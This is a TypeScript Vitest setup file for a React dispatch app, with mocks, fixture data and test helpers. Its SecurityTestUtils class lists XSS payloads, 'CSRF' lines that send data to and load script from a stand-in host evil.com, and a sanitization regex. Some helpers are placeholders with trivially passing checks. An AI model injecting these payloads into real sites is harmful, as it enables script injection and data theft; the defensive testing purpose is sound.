/**
 * Enterprise Frontend Testing Setup
 * Comprehensive testing configuration for React components and user interactions
 */

import { expect, afterEach, beforeAll, afterAll } from 'vitest';
import { cleanup } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { BrowserRouter } from 'react-router-dom';
import { vi } from 'vitest';
import * as matchers from '@testing-library/jest-dom/matchers';

// Extend Vitest's expect with jest-dom matchers
expect.extend(matchers);

// Global test configuration
beforeAll(() => {
  // Mock environment variables
  process.env.VITE_SUPABASE_URL = 'https://test.supabase.co';
  process.env.VITE_SUPABASE_ANON_KEY = 'test-anon-key';
  process.env.VITE_APP_ENV = 'test';
  
  // Mock console methods to reduce noise in tests
  global.console = {
    ...console,
    log: vi.fn(),
    debug: vi.fn(),
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
  };

  // Mock window.matchMedia
  Object.defineProperty(window, 'matchMedia', {
    writable: true,
    value: vi.fn().mockImplementation(query => ({
      matches: false,
      media: query,
      onchange: null,
      addListener: vi.fn(),
      removeListener: vi.fn(),
      addEventListener: vi.fn(),
      removeEventListener: vi.fn(),
      dispatchEvent: vi.fn(),
    })),
  });

  // Mock IntersectionObserver
  global.IntersectionObserver = vi.fn().mockImplementation(() => ({
    observe: vi.fn(),
    unobserve: vi.fn(),
    disconnect: vi.fn(),
  }));

  // Mock ResizeObserver
  global.ResizeObserver = vi.fn().mockImplementation(() => ({
    observe: vi.fn(),
    unobserve: vi.fn(),
    disconnect: vi.fn(),
  }));

  // Mock scrollTo
  global.scrollTo = vi.fn();
});

afterEach(() => {
  cleanup();
  vi.clearAllMocks();
});

afterAll(() => {
  vi.restoreAllMocks();
});

// Custom matchers for enterprise testing
declare global {
  namespace Vi {
    interface Assertion<T> {
      toBeAccessible(): T;
      toHaveValidFormValidation(): T;
      toMeetPerformanceThreshold(threshold: number): T;
      toHaveProperErrorHandling(): T;
      toBeResponsive(): T;
      toHaveValidAccessibility(): T;
    }
  }
}

// Custom matchers
expect.extend({
  toBeAccessible(received: HTMLElement) {
    const hasAriaLabels = received.querySelectorAll('[aria-label]').length > 0;
    const hasAltText = received.querySelectorAll('img[alt]').length > 0;
    const hasHeadings = received.querySelectorAll('h1, h2, h3, h4, h5, h6').length > 0;
    const hasFocusableElements = received.querySelectorAll('button, input, select, textarea, a[href]').length > 0;
    
    const isAccessible = hasAriaLabels || hasAltText || hasHeadings || hasFocusableElements;
    
    return {
      message: () => `expected element to be accessible`,
      pass: isAccessible
    };
  },

  toHaveValidFormValidation(received: HTMLElement) {
    const hasRequiredFields = received.querySelectorAll('[required]').length > 0;
    const hasValidationMessages = received.querySelectorAll('[aria-invalid]').length > 0;
    const hasFormElements = received.querySelectorAll('form').length > 0;
    
    const hasValidation = hasRequiredFields || hasValidationMessages || hasFormElements;
    
    return {
      message: () => `expected element to have valid form validation`,
      pass: hasValidation
    };
  },

  toMeetPerformanceThreshold(received: number, threshold: number) {
    const meetsThreshold = received <= threshold;
    
    return {
      message: () => `expected ${received}ms to be <= ${threshold}ms`,
      pass: meetsThreshold
    };
  },

  toHaveProperErrorHandling(received: HTMLElement) {
    const hasErrorMessages = received.querySelectorAll('[role="alert"]').length > 0;
    const hasErrorStates = received.querySelectorAll('[aria-invalid="true"]').length > 0;
    const hasErrorClasses = received.classList.contains('error') || received.classList.contains('invalid');
    
    const hasErrorHandling = hasErrorMessages || hasErrorStates || hasErrorClasses;
    
    return {
      message: () => `expected element to have proper error handling`,
      pass: hasErrorHandling
    };
  },

  toBeResponsive(received: HTMLElement) {
    const hasResponsiveClasses = received.classList.contains('responsive') || 
                                received.classList.contains('mobile') ||
                                received.classList.contains('tablet') ||
                                received.classList.contains('desktop');
    const hasMediaQueries = window.getComputedStyle(received).getPropertyValue('--breakpoint');
    
    const isResponsive = hasResponsiveClasses || !!hasMediaQueries;
    
    return {
      message: () => `expected element to be responsive`,
      pass: isResponsive as boolean
    };
  },

  toHaveValidAccessibility(received: HTMLElement) {
    const hasAriaLabels = received.querySelectorAll('[aria-label]').length > 0;
    const hasAriaDescribedBy = received.querySelectorAll('[aria-describedby]').length > 0;
    const hasRole = received.getAttribute('role') !== null;
    const hasTabIndex = received.getAttribute('tabindex') !== null;
    
    const hasAccessibility = hasAriaLabels || hasAriaDescribedBy || hasRole || hasTabIndex;
    
    return {
      message: () => `expected element to have valid accessibility`,
      pass: hasAccessibility
    };
  }
});

// Test utilities
export class TestUtils {
  static createTestQueryClient() {
    return new QueryClient({
      defaultOptions: {
        queries: {
          retry: false,
          gcTime: 0, // React Query v4+ uses gcTime instead of cacheTime
        },
        mutations: {
          retry: false,
        },
      },
    });
  }

  static createTestWrapper(children: React.ReactNode) {
    const queryClient = this.createTestQueryClient();
    
    return (
      <QueryClientProvider client={queryClient}>
        <BrowserRouter>
          {children}
        </BrowserRouter>
      </QueryClientProvider>
    );
  }

  static mockSupabaseClient() {
    return {
      auth: {
        signInWithPassword: vi.fn(),
        signOut: vi.fn(),
        getSession: vi.fn(),
        onAuthStateChange: vi.fn(),
      },
      from: vi.fn(() => ({
        select: vi.fn().mockReturnThis(),
        insert: vi.fn().mockReturnThis(),
        update: vi.fn().mockReturnThis(),
        delete: vi.fn().mockReturnThis(),
        eq: vi.fn().mockReturnThis(),
        single: vi.fn(),
        then: vi.fn(),
      })),
    };
  }

  static mockAuthUser() {
    return {
      id: 'test-user-id',
      email: 'test@example.com',
      user_metadata: {
        tenant_id: 'test-tenant-id',
        role: 'dispatcher',
      },
    };
  }

  static mockCustomer() {
    return {
      id: 'test-customer-id',
      first_name: 'Test',
      last_name: 'Customer',
      email: 'customer@example.com',
      phone: '+1-555-0000',
      address: '123 Test Street',
      city: 'Test City',
      state: 'TC',
      zip_code: '12345',
      tenant_id: 'test-tenant-id',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
    };
  }

  static mockWorkOrder() {
    return {
      id: 'test-work-order-id',
      customer_id: 'test-customer-id',
      technician_id: 'test-technician-id',
      status: 'scheduled',
      priority: 'medium',
      service_type: 'pest_control',
      scheduled_date: new Date().toISOString(),
      description: 'Test work order description',
      tenant_id: 'test-tenant-id',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
    };
  }

  static mockTechnician() {
    return {
      id: 'test-technician-id',
      first_name: 'Test',
      last_name: 'Technician',
      email: 'technician@example.com',
      phone: '+1-555-0000',
      skills: ['pest_control', 'inspection'],
      availability: 'available',
      tenant_id: 'test-tenant-id',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
    };
  }

  static async measurePerformance(fn: () => Promise<any>): Promise<{ result: any; duration: number }> {
    const start = performance.now();
    const result = await fn();
    const duration = performance.now() - start;
    return { result, duration };
  }

  static generateTestData(count: number, factory: () => any) {
    return Array.from({ length: count }, factory);
  }

  static mockLocalStorage() {
    const store: Record<string, string> = {};
    
    return {
      getItem: vi.fn((key: string) => store[key] || null),
      setItem: vi.fn((key: string, value: string) => {
        store[key] = value;
      }),
      removeItem: vi.fn((key: string) => {
        delete store[key];
      }),
      clear: vi.fn(() => {
        Object.keys(store).forEach(key => delete store[key]);
      }),
    };
  }

  static mockSessionStorage() {
    const store: Record<string, string> = {};
    
    return {
      getItem: vi.fn((key: string) => store[key] || null),
      setItem: vi.fn((key: string, value: string) => {
        store[key] = value;
      }),
      removeItem: vi.fn((key: string) => {
        delete store[key];
      }),
      clear: vi.fn(() => {
        Object.keys(store).forEach(key => delete store[key]);
      }),
    };
  }
}

// Accessibility testing utilities
export class AccessibilityTestUtils {
  static checkAriaLabels(element: HTMLElement): boolean {
    const inputs = element.querySelectorAll('input, select, textarea');
    let allHaveLabels = true;
    
    inputs.forEach(input => {
      const hasLabel = input.getAttribute('aria-label') || 
                      input.getAttribute('aria-labelledby') ||
                      element.querySelector(`label[for="${input.id}"]`);
      if (!hasLabel) {
        allHaveLabels = false;
      }
    });
    
    return allHaveLabels;
  }

  static checkColorContrast(element: HTMLElement): boolean {
    // Basic color contrast check
    const computedStyle = window.getComputedStyle(element);
    const backgroundColor = computedStyle.backgroundColor;
    const color = computedStyle.color;
    
    // In a real implementation, you would calculate the contrast ratio
    return backgroundColor !== color;
  }

  static checkKeyboardNavigation(element: HTMLElement): boolean {
    const focusableElements = element.querySelectorAll(
      'button, input, select, textarea, a[href], [tabindex]:not([tabindex="-1"])'
    );
    
    return focusableElements.length > 0;
  }

  static checkScreenReaderSupport(element: HTMLElement): boolean {
    const hasAriaLabels = element.querySelectorAll('[aria-label]').length > 0;
    const hasAriaDescribedBy = element.querySelectorAll('[aria-describedby]').length > 0;
    const hasRole = element.getAttribute('role') !== null;
    
    return hasAriaLabels || hasAriaDescribedBy || hasRole;
  }
}

// Performance testing utilities
export class PerformanceTestUtils {
  static async measureRenderTime(renderFn: () => void): Promise<number> {
    const start = performance.now();
    renderFn();
    const end = performance.now();
    return end - start;
  }

  static async measureComponentMount(_component: React.ComponentType): Promise<number> {
    const start = performance.now();
    // In a real implementation, you would mount the component
    const end = performance.now();
    return end - start;
  }

  static checkMemoryUsage(): number {
    if ('memory' in performance) {
      return (performance as any).memory.usedJSHeapSize;
    }
    return 0;
  }
}

// Security testing utilities
export class SecurityTestUtils {
  static generateXSSPayloads(): string[] {
    return [
      '<script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '<iframe src=javascript:alert("XSS")></iframe>',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<keygen onfocus=alert("XSS") autofocus>'
    ];
  }

  static generateCSRFPayloads(): string[] {
    return [
      '<form action="http://evil.com/steal" method="POST">',
      '<img src="http://evil.com/steal?data=secret">',
      '<iframe src="http://evil.com/steal"></iframe>',
      '<script src="http://evil.com/steal.js"></script>'
    ];
  }

  static checkInputSanitization(input: string): boolean {
    const dangerousPatterns = [
      /<script/i,
      /javascript:/i,
      /on\w+\s*=/i,
      /<iframe/i,
      /<object/i,
      /<embed/i
    ];
    
    return !dangerousPatterns.some(pattern => pattern.test(input));
  }
}

// Utilities already exported as class declarations above
// No need for duplicate export statement
